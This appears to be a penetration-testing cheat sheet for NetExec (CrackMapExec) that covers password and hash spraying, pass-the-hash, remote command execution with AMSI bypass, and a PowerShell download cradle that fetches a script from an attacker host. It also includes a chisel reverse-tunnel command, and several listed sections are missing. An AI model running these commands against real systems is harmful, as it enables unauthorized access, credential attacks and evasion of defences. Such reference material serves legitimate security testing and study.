NetExec / CrackMapExec

NetExec (the successor to CrackMapExec) is the Swiss-army knife for post-foothold AD work — one tool for every protocol: SMB, LDAP, WinRM, MSSQL, SSH, FTP, RDP, WMI, NFS and VNC. Covers auth, enumeration, password and hash spraying, relay-list generation, Kerberos attacks (ASREPRoast, Kerberoasting, delegation hunting), credential dumping (SAM, LSA, NTDS, LSASS modules, DPAPI, SCCM), BloodHound integration, and the full pentest workflow.

Core Usage & Global Options SMB Protocol LDAP Protocol WinRM Protocol MSSQL Protocol SSH Protocol FTP Protocol RDP Protocol WMI Protocol NFS Protocol VNC Protocol Proxychains + Chisel Integration Quick Reference — Pentest Workflow References

NetExec (nxc) is the successor to CrackMapExec (cme). All commands below use nxc syntax. Supported protocols: SMB, LDAP, WinRM, MSSQL, SSH, FTP, RDP, WMI, NFS, VNC.

Core Usage & Global Options

## View all protocols
nxc --help

## View protocol-specific options
nxc <PROTOCOL> --help

## Threading, timeout, jitter
nxc <PROTOCOL> <TARGET> -t <THREADS> --timeout <SECONDS> --jitter <INTERVAL>
## Example: nxc smb <TARGET> --jitter 2-5 -u users.txt -p passwords.txt

## DNS options
nxc <PROTOCOL> <TARGET> --dns-server <DNS_IP>
nxc <PROTOCOL> <TARGET> --dns-tcp           # Use TCP for DNS
nxc <PROTOCOL> <TARGET> -6                  # Force IPv6

## Logging
nxc <PROTOCOL> <TARGET> --log output.txt    # Log current command output
## Or set log_mode = True in ~/.nxc/nxc.conf for persistent logging

## Export function (output as JSON — buggy, requires full path)
nxc <PROTOCOL> <TARGET> [options] --export $(pwd)/output.txt
## Format exported JSON: sed -i "s/'/\"/g" output.txt && cat output.txt | jq

## Audit mode (redact creds from output)
## Set audit_mode character in ~/.nxc/nxc.conf

## Ignore OpSec warnings
## Set ignore_opsec = True in ~/.nxc/nxc.conf

Target Formats

nxc <PROTOCOL> <HOSTNAME>                   # Single host
nxc <PROTOCOL> <IP1> <IP2> <IP3>            # Multiple IPs
nxc <PROTOCOL> <IP>/24                      # CIDR notation
nxc <PROTOCOL> <IP_START>-<IP_END>          # IP range
nxc <PROTOCOL> targets.txt                  # File (one target per line)

Authentication (All Protocols)

## Username/password
nxc <PROTOCOL> <TARGET> -u <USER> -p '<PASS>'

## Pass-the-Hash
nxc <PROTOCOL> <TARGET> -u <USER> -H '<NTHASH>'
nxc <PROTOCOL> <TARGET> -u <USER> -H '<LM:NT>'

## Kerberos (password-based — auto TGT)
nxc <PROTOCOL> <TARGET> -u <USER> -p '<PASS>' -k

## Kerberos (ccache ticket)
export KRB5CCNAME=/path/to/ticket.ccache
nxc <PROTOCOL> <TARGET> --use-kcache
nxc <PROTOCOL> <TARGET> --use-kcache --kdcHost <DC_FQDN>

## Certificate-based
nxc smb <TARGET> --pfx-cert user.pfx -u <USER>
nxc smb <TARGET> --pfx-cert user.pfx --pfx-pass <PASS> -u <USER>
nxc smb <TARGET> --pem-cert user.pem --pem-key key.pem -u <USER>

## Local auth (not domain)
nxc <PROTOCOL> <TARGET> -u <USER> -p '<PASS>' --local-auth

## Credentials with special chars (wrap in single quotes)
nxc <PROTOCOL> <TARGET> -u <USER> -p 'P@ss!w0rd'

## Credentials starting with dash
nxc <PROTOCOL> <TARGET> -u='-username' -p='-password'

## Use credential ID from database
nxc <PROTOCOL> <TARGET> -id <CRED_ID>

## Multi-domain auth (FILE format: DOMAIN1\user per line)
nxc <PROTOCOL> <TARGET> -u users_with_domains.txt -p '<PASS>'

Password Spraying (All Protocols)

## Single password against user list
nxc <PROTOCOL> <TARGET> -u users.txt -p '<PASS>' --continue-on-success

## Multiple passwords (bruteforce matrix)
nxc <PROTOCOL> <TARGET> -u users.txt -p passwords.txt

## One-to-one mapping (user1→pass1, user2→pass2)
nxc <PROTOCOL> <TARGET> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

## Check username == password
nxc <PROTOCOL> <TARGET> -u users.txt -p users.txt --no-bruteforce --continue-on-success

## Hash spraying
nxc <PROTOCOL> <TARGET> -u users.txt -H hashes.txt --no-bruteforce --continue-on-success

## Throttle attempts (jitter in seconds)
nxc <PROTOCOL> <TARGET> --jitter 3 -u users.txt -p passwords.txt
nxc <PROTOCOL> <TARGET> --jitter 2-5 -u users.txt -p passwords.txt

## Fail limits (prevent lockout)
nxc <PROTOCOL> <TARGET> --gfail-limit <LIMIT> -u users.txt -p passwords.txt  # Global failed login limit
nxc <PROTOCOL> <TARGET> --ufail-limit <LIMIT> -u users.txt -p passwords.txt  # Per-username fail limit
nxc <PROTOCOL> <TARGET> --fail-limit <LIMIT> -u users.txt -p passwords.txt   # Per-host fail limit

Account Status Colors: Green = valid creds, Red = invalid user/pass, Magenta = valid creds but auth failed (see status codes below).

STATUS codes (Magenta): STATUS_ACCOUNT_DISABLED, STATUS_ACCOUNT_EXPIRED, STATUS_ACCOUNT_RESTRICTION, STATUS_INVALID_LOGON_HOURS, STATUS_INVALID_WORKSTATION, STATUS_LOGON_TYPE_NOT_GRANTED, STATUS_PASSWORD_EXPIRED, STATUS_PASSWORD_MUST_CHANGE, STATUS_ACCESS_DENIED. For STATUS_INVALID_LOGON_HOURS / STATUS_INVALID_WORKSTATION, try a different time or workstation. For STATUS_PASSWORD_MUST_CHANGE, change the password with smbpasswd.

## Handle STATUS_PASSWORD_MUST_CHANGE (change password via smbpasswd)
smbpasswd -r <DC_IP> -U <USER>
## Enter old password, then new password twice

## Monitor bad password count before spraying (requires auth)
## Authenticated --users shows badpwdcount per user
nxc smb <TARGET> -u <USER> -p '<PASS>' --users
## Output includes: badpwdcount: N — track this to avoid lockout
## Note: Bad password count resets when user authenticates with correct creds

BloodHound Integration

## Auto-mark owned users in BloodHound (configure ~/.nxc/nxc.conf):
## [BloodHound]
## bh_enabled = True
## bh_uri = 127.0.0.1
## bh_port = 7687
## bh_user = user
## bh_pass = pass
## With bh_enabled = True, any successful auth auto-marks users as owned
## Modules like lsassy/procdump also mark found users as owned
## Note: --ntds and --lsa do NOT auto-mark users

## Mark computers as owned (users are marked auto, computers need this module)
nxc smb <TARGET> -u <USER> -p '<PASS>' -M bh_owned -o PASS=<NEO4J_PASS>
nxc smb <TARGET> -u <USER> -p '<PASS>' -M bh_owned -o URI=<NEO4J_IP> PORT=7687 USER=neo4j PASS=<NEO4J_PASS>

## BloodHound data collection via LDAP
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --bloodhound --collection All
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --bloodhound --collection Method1,Method2

SMB Command Execution

UAC Note: When UAC is enabled (default), only the built-in Administrator (RID 500) can execute remote commands as a local admin. Other local admins in the Administrators group will NOT get Pwn3d!. Set LocalAccountTokenFilterPolicy = 1 to allow all local admins. Domain accounts in the local Administrators group are NOT affected by this restriction. Check FilterAdministratorToken — if set to 1, even RID 500 is blocked.

## CMD command (-x)
nxc smb <TARGET> -u <USER> -p '<PASS>' -x 'whoami'

## PowerShell command (-X) — auto AMSI bypass + obfuscation
nxc smb <TARGET> -u <USER> -p '<PASS>' -X '$PSVersionTable'

## Custom AMSI bypass payload (if default is detected)
nxc smb <TARGET> -u <USER> -p '<PASS>' -X '<CMD>' --amsi-bypass /path/to/payload
## Tip: if payload exceeds 8191 chars, host it on a web server and use a download cradle:
## echo "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/bypass.ps1');" > amsibypass.txt

## Force execution method
nxc smb <TARGET> -u <USER> -p '<PASS>' -x 'whoami' --exec-method wmiexec
nxc smb <TARGET> -u <USER> -p '<PASS>' -x 'whoami' --exec-method atexec
nxc smb <TARGET> -u <USER> -p '<PASS>' -x 'whoami' --exec-method smbexec
nxc smb <TARGET> -u <USER> -p '<PASS>' -x 'whoami' --exec-method mmcexec
## Default failover order: wmiexec → atexec → smbexec → mmcexec

## Impersonate logged-on user via scheduled task

LDAP Protocol

Important: LDAP queries require the DC's FQDN, not just the IP. If using an IP, you may get "Error connecting to the domain." Either configure DNS to resolve the domain or add the FQDN to /etc/hosts.

LDAP Authentication & Enumeration

## Test credentials
nxc ldap <DC_IP> -u <USER> -p '<PASS>'
nxc ldap <DC_IP> -u <USER> -H '<NTHASH>'

Proxychains + Chisel Integration

## Use CME through a pivot host to reach internal networks

## 3. Execute Chisel client on pivot host
nxc smb <PIVOT_IP> -u <USER> -p '<PASS>' -x "C:\Windows\Temp\chisel.exe client <ATTACKER_IP>:8080 R:socks"
